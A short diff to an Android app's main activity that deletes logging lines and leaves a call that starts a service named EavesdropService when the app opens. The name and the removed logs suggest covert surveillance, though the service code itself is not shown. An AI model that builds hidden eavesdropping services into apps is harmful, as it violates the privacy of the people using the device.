@@ -12,16 +12,12 @@ import android.util.Log;
 
 public class MainActivity extends AppCompatActivity {
 
-
-    String TAG = "APLIKACE";
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
         Intent intent = new Intent(this, EavesdropService.class);
-        Log.e(TAG, "Starting service");
         startService(intent);
-        Log.e(TAG, "Started");
     }
 }
